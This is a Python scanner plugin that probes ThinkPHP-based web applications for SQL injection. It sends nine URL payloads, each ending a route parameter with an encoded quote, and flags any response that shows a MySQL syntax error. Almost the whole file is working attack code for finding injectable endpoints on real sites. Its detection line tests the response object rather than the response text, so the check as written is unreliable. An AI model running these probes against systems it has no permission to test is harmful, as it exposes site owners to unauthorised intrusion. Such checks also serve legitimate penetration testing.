#-*- coding:utf-8 -*-
import os
import requests
from lib.utils.path_info import get_path_info
from lib.utils.package import make_request_package 

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:76.0) Gecko/20100101 Firefox/76.0',
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Connection': 'close'
    }

def check(url):
    results = []
    items = {
        "Url": url, 
        "Script": get_path_info(os.path.dirname(__file__)),
        "Vuln": 'thinkphp_information_leak', 
        "Type": None, 
        "Request": None
    }
    payload1 = '?s=/home/shopcart/getPricetotal/tag/1%27'
    payload2 = '?s=/home/shopcart/getpriceNum/id/1%27'
    payload3 = '?s=/home/user/cut/id/1%27'
    payload4 = '?s=/home/service/index/id/1%27'
    payload5 = '?s=/home/pay/chongzhi/orderid/1%27'
    payload6 = '?s=/home/pay/index/orderid/1%27'
    payload7 = '?s=/home/order/complete/id/1%27'
    payload8 = '?s=/home/order/detail/id/1%27'
    payload9 = '?s=/home/order/cancel/id/1%27'

    try:
        s = requests.session()
        s.keep_alive = False
        for payload in (payload1,payload2,payload3,payload4,payload5,payload6,payload7,payload8,payload9):
            res = s.get(url + payload, headers=headers)
            if '1064 You have' in res:
                items['Type'] = 'GET'
                items['Request'] = make_request_package(res.request)
                results.append(items.copy())

        if len(results) == 0:
            return False
        return results

    except Exception as e:
        print(e)
        return False

if __name__ == '__main__':
    pass